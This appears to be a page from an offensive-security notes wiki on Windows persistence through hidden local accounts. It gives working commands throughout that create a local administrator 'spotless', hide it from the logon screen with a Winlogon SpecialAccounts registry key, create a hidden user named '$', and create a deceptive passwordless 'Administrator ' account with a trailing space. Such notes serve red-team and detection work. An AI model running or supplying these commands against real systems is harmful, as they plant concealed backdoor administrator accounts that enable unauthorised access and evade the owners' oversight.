# Add User

## <mark style="color:red;">Hide From Logon Screen</mark>

Creating User and Adding to Local Administrators

```
net user spotless spotless /add & net localgroup Administrators spotless /add
```

Hide Newly Created Local administrator

{% hint style="danger" %}
This will only hide the username from winlogon screen (windows login GUI screen),  but the user can be detected with <mark style="color:green;">`net user`</mark>` ``` command
{% endhint %}

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
```

## <mark style="color:red;">Create a Hidden User Called "$"</mark>

Creating a user with a username containing "$"

```
net user $ ATOMIC123! /add /active:yes
```

## <mark style="color:red;">Create an "Administrator " user (with a space on the end)</mark>

```
New-LocalUser -Name "Administrator " -NoPassword
```
